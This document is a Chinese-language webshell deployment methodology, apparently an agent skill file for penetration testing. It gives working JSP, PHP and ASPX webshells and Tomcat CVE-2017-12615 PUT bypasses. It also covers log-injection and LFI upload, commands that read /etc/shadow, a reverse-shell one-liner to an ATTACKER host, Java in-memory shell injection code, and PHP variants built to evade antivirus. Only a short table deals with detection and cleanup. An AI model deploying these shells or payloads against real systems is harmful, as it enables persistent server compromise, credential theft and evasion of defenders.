# webshell-deploy

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# Webshell 部署与利用方法论


当漏洞利用需要上传/写入 webshell 时，按此方法论操作。

## ⛔ 深入参考

- 各平台 webshell 变体（免杀、WAF 绕过、各平台兼容版本）→ `references/webshell-payloads.md`
- Java 内存马（Filter/Servlet/Listener/Agent，无文件落地）→ [references/memory-webshell.md](references/memory-webshell.md)

## 核心原则

1. **永远不要在 curl -d 参数中内联 JSP/PHP 代码** — 转义问题会导致 payload 损坏
2. **先写本地文件，再用 `--data-binary @file` 上传** — 保证 payload 完整性
3. **一次成功比多次尝试重要** — 按正确顺序操作，避免反复试错

---

## Phase 1: 选择 Webshell 类型

根据目标技术栈选择：

| 技术栈 | 文件类型 | 上传路径示例 |
|--------|---------|-------------|
| Java/Tomcat/JBoss | `.jsp` | `/shell.jsp` |
| PHP/Apache/Nginx | `.php` | `/shell.php` |
| ASP.NET/IIS | `.aspx` | `/shell.aspx` |
| Python/Flask/Django | `.py` | 通常无法直接上传 |

## Phase 2: 生成 Webshell 文件（本地）

### ⚠️ 关键：必须写入本地文件

```bash
# ✅ 正确做法：写入本地文件
cat > /tmp/shell.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) { out.println(line); }
    br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = br.readLine()) != null) { out.println(line); }
}
%>
EOF

# ❌ 错误做法：在 curl -d 中内联代码（转义问题）
# curl -X PUT url/shell.jsp -d "<%@ page import=\"java.util.*\"..."
# 这会因为引号、百分号、尖括号的转义导致 payload 损坏
```

### PHP Webshell

```bash
cat > /tmp/shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    echo "</pre>";
}
?>
EOF
```

### ASPX Webshell

```bash
cat > /tmp/shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>
EOF
```

## Phase 3: 上传 Webshell

### 方法 A: HTTP PUT 上传（Tomcat PUT CVE-2017-12615）

```bash
# 使用 --data-binary 上传本地文件（保持原始内容）
# 注意：必须使用路径绕过技巧，直接 PUT /shell.jsp 会被拒绝

# 绕过方式 1: 末尾加斜杠 (Linux)
curl -X PUT "http://TARGET:8080/shell.jsp/" --data-binary @/tmp/shell.jsp -v

# 绕过方式 2: 末尾加空格 %20
curl -X PUT "http://TARGET:8080/shell.jsp%20" --data-binary @/tmp/shell.jsp -v

# 绕过方式 3: NTFS 流 (Windows)
curl -X PUT "http://TARGET:8080/shell.jsp::$DATA" --data-binary @/tmp/shell.jsp -v
```

**判断上传成功**：响应码 `201 Created` 或 `204 No Content`。

### 方法 B: 文件上传表单

```bash
curl -X POST "http://TARGET/upload" \
    -F "file=@/tmp/shell.jsp;filename=shell.jsp" \
    -v
```

### 方法 C: 文件包含写入

```bash
# 通过日志注入写入 webshell
curl "http://TARGET/" -A '<?php system($_GET["cmd"]); ?>'
# 然后通过 LFI 包含日志文件
curl "http://TARGET/vuln.php?file=/var/log/apache2/access.log&cmd=id"
```

## Phase 4: 验证 Webshell

```bash
# 上传后立即验证
curl -s "http://TARGET:8080/shell.jsp?cmd=id"

# 期望输出: uid=0(root) 或类似用户信息
# 如果返回空/404/500，检查：
#   1. 上传路径是否正确（有无绕过后缀变化）
#   2. Webshell 代码是否完整（查看原文件大小）
#   3. 目标是否需要不同的 webshell 变体
```

## Phase 5: 利用 Webshell

```bash
# 基本命令执行
curl -s "http://TARGET:8080/shell.jsp?cmd=whoami"
curl -s "http://TARGET:8080/shell.jsp?cmd=uname+-a"
curl -s "http://TARGET:8080/shell.jsp?cmd=cat+/etc/passwd"

# URL 编码空格和特殊字符
curl -s "http://TARGET:8080/shell.jsp?cmd=ls%20-la%20/"
curl -s "http://TARGET:8080/shell.jsp?cmd=cat%20/etc/shadow"

# 反弹 shell（高级利用）
curl -s "http://TARGET:8080/shell.jsp?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER/4444%200>%261'"
```

## 常见错误与解决

| 问题 | 原因 | 解决 |
|------|------|------|
| PUT 返回 404 | 直接 PUT .jsp 被 Tomcat 拒绝 | 用 `/shell.jsp/` 或 `%20` 绕过 |
| Webshell 返回空白 | payload 被截断或转义损坏 | 检查文件大小，重新用 `--data-binary @file` 上传 |
| Webshell 返回 500 | JSP 编译错误 | 检查 payload 语法，尤其是引号和特殊字符 |
| 命令无输出 | 使用了 `exec()` 而非 shell `-c` | 改用 `new String[]{"/bin/sh", "-c", cmd}` |
| 文件名被重命名 | 应用端重命名了上传文件 | 从响应中提取实际文件名/路径 |

## 决策树

```
需要 webshell？
├── 目标支持 PUT？
│   ├── 是 → Phase 2 写文件 → Phase 3A PUT 上传（三种绕过按序试）
│   └── 否 → 有文件上传功能？
│       ├── 是 → Phase 3B 表单上传
│       └── 否 → 有 LFI？
│           ├── 是 → Phase 3C 日志写入 + 文件包含
│           └── 否 → 寻找其他 RCE 路径
└── 上传成功？
    ├── 是 → Phase 4 验证 → Phase 5 利用
    └── 否 → 换绕过方式 → 仍失败 → 换技术栈对应的 shell 类型
```


---

## REF: memory-webshell

# Java 内存马（Memory Webshell）

内存马不写入文件，完全驻留在 JVM 内存中，重启后消失。适用于文件系统受监控或无写权限的场景。

## Table of Contents
- [Filter 内存马](#filter-内存马)
- [Servlet 内存马](#servlet-内存马)
- [Listener 内存马](#listener-内存马)
- [Spring Controller 内存马](#spring-controller-内存马)
- [Java Agent 内存马](#java-agent-内存马)
- [注入方式](#注入方式)
- [检测与清除](#检测与清除)

---

## Filter 内存马

**原理**：动态注册一个恶意 Filter，拦截所有请求并执行命令。

**优点**：所有基于 Servlet 容器的应用都支持（Tomcat/Jetty/WebLogic/JBoss）。

```java
// Filter 内存马核心代码（通过反序列化/SSTI/EL 注入）
<%@ page import="java.io.*,java.lang.reflect.*,org.apache.catalina.core.*" %>
<%
    // 获取 StandardContext
    ServletContext servletContext = request.getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    // 创建恶意 Filter
    Filter filter = new Filter() {
        @Override
        public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
                throws IOException, ServletException {
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                StringBuilder sb = new StringBuilder();
                while ((line = br.readLine()) != null) sb.append(line).append("\n");
                resp.getWriter().write(sb.toString());
                return;
            }
            chain.doFilter(req, resp);
        }
        @Override public void init(FilterConfig c) {}
        @Override public void destroy() {}
    };

    // 注册 Filter
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName("evilFilter");
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName("evilFilter");
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMapBefore(filterMap);

    // 反射设置 FilterConfig
    Constructor<ApplicationFilterConfig> constructor =
        ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = constructor.newInstance(standardContext, filterDef);
    standardContext.filterStart();

    out.println("Filter Memory Shell Injected!");
%>
```

**使用**：注入后访问任意 URL 加 `?cmd=id` 即可执行命令。

---

## Servlet 内存马

```java
<%@ page import="java.io.*,java.lang.reflect.*,org.apache.catalina.core.*" %>
<%
    // 获取 StandardContext (同上)
    // ...

    // 创建恶意 Servlet
    Servlet servlet = new HttpServlet() {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp)
                throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = br.readLine()) != null) resp.getWriter().println(line);
            }
        }
    };

    // 注册 Servlet
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName("evilServlet");
    wrapper.setServlet(servlet);
    wrapper.setServletClass(servlet.getClass().getName());
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/evil", "evilServlet");

    out.println("Servlet Memory Shell Injected at /evil?cmd=id");
%>
```

---

## Listener 内存马

**优点**：比 Filter 更隐蔽，在请求处理链最前端执行。

```java
<%@ page import="java.io.*,javax.servlet.*,org.apache.catalina.core.*" %>
<%
    // 获取 StandardContext (同上)
    // ...

    // 创建恶意 Listener
    ServletRequestListener listener = new ServletRequestListener() {
        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) sb.append(line).append("\n");
                    // 将结果写入 request attribute，由后续逻辑返回
                    req.setAttribute("cmd_result", sb.toString());
                } catch (Exception e) {}
            }
        }
        @Override public void requestDestroyed(ServletRequestEvent sre) {}
    };

    standardContext.addApplicationEventListener(listener);
    out.println("Listener Memory Shell Injected!");
%>
```

---

## Spring Controller 内存马

适用于 Spring Boot/MVC 应用：

```java
// 通过 SpEL 注入或反序列化触发
// 注册一个新的 Controller mapping

RequestMappingHandlerMapping mapping = 
    (RequestMappingHandlerMapping) context.getBean("requestMappingHandlerMapping");

Method method = evilController.getClass().getMethod("exec", HttpServletRequest.class);
RequestMappingInfo info = RequestMappingInfo.paths("/evil").build();
mapping.registerMapping(info, evilController, method);
```

---

## Java Agent 内存马

**原理**：通过 Java Instrumentation API 修改已加载类的字节码（如 `javax.servlet.http.HttpServlet#service`），在方法前插入恶意逻辑。

**优点**：最隐蔽，不添加新的 Filter/Servlet/Listener。
**缺点**：需要 attach 到目标 JVM（需要足够权限）。

```bash
# Step 1: 上传 agent.jar 到目标
# Step 2: 找到目标 Java 进程 PID
ps aux | grep java

# Step 3: attach agent
java -cp tools.jar:agent.jar AgentMain PID
```

Agent 注入后，修改 HttpServlet.service() 方法，在每个请求中检查特定参数执行命令。

---

## 注入方式

内存马代码需要通过某种漏洞注入到 JVM：

| 漏洞类型 | 注入方法 |
|----------|----------|
| 反序列化 | 构造 gadget chain 执行上述 Java 代码 |
| SSTI (FreeMarker/Velocity) | 通过模板执行 Java 反射代码 |
| EL 表达式注入 | `${Runtime.getRuntime().exec(...)}` |
| JSP webshell | 先上传普通 JSP → 执行内存马注入代码 → 删除 JSP |
| JNDI 注入 (Log4Shell) | 加载远程恶意类 |
| 文件上传 + 解压 | 上传 agent.jar → Java Attach |

**推荐流程**：先通过任何方式获取代码执行 → 注入 Filter 内存马 → 删除落地文件。

---

## 检测与清除

| 检测方式 | 命令/方法 |
|----------|-----------|
| 列出所有 Filter | 通过 JMX 或 StandardContext 反射 |
| 对比 web.xml | web.xml 中没有的 Filter/Servlet = 内存马 |
| Java Agent 检测 | 检查已加载的 Instrumentation Agent |
| 内存扫描 | arthas `sc *Filter*` 搜索可疑类 |

**清除**：重启应用即可清除所有内存马（它们只存在于内存中）。


---

## REF: webshell-payloads

### JSP Webshell 变体

```jsp
// 标准命令执行
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) { out.println(line); }
    br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = br.readLine()) != null) { out.println(line); }
}
%>

// 极简版（无回显，盲命令）
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### PHP Webshell 免杀变体

```php
// 标准
<?php if(isset($_REQUEST['cmd'])){echo "<pre>";system($_REQUEST['cmd']);echo "</pre>";}?>

// 字符串拼接避免关键字
<?php $f='sys'.'tem';if(isset($_REQUEST['cmd'])){$f($_REQUEST['cmd']);}?>

// 变量函数 + base64
<?php @eval(base64_decode($_POST['c']));?>

// 回调函数
<?php array_map(function($v){eval($v);}, [$_POST['c']]);?>

// create_function (PHP<8.0)
<?php $fn=create_function('$a','eval($a);');$fn($_POST['c']);?>

// preg_replace /e (PHP<7.0)
<?php @preg_replace('/.*/e',$_POST['c'],'');?>

// usort 回调
<?php usort($_POST,'asse'.'rt');?>

// 动态 GET 函数
<?php $_GET['f']($_GET['c']);?>
```

### 免杀技巧速查

| 技术 | 原理 | 版本 |
|------|------|------|
| 字符串拼接 | 'sys'.'tem' 避免关键字 | 全版本 |
| 变量函数 | $f='assert';$f($code) | 全版本 |
| 回调函数 | array_map/usort + callback | 全版本 |
| 编码嵌套 | base64/rot13/gzinflate | 全版本 |
| create_function | 动态匿名函数 | <8.0 |
| preg_replace /e | 正则替换执行 | <7.0 |
| 异或运算 | XOR 拼函数名 | 全版本 |
| 图片马 | webshell 追加图片 + LFI | 需 LFI |

### Tomcat CVE-2017-12615 PUT 绕过

| 绕过 | URL | 平台 |
|------|-----|------|
| 末尾斜杠 | /shell.jsp/ | Linux |
| 末尾空格 | /shell.jsp%20 | Linux/Windows |
| NTFS 流 | /shell.jsp::$DATA | Windows |
| 末尾点 | /shell.jsp. | Windows |

```bash
# 验证顺序
for bypass in "/" "%20" "::$DATA"; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
    "http://TARGET:8080/shell.jsp${bypass}" --data-binary @/tmp/shell.jsp)
  [ "$resp" = "201" ] && echo OK && break
done
# 访问时不带绕过后缀
curl -s "http://TARGET:8080/shell.jsp?cmd=id"
```

### 上传后验证清单

1. URL 不返回 404
2. cmd=id 返回非空/非 500
3. 记录 URL 和参数名
4. cmd=whoami 确认权限级别
5. 测试结束清理 webshell

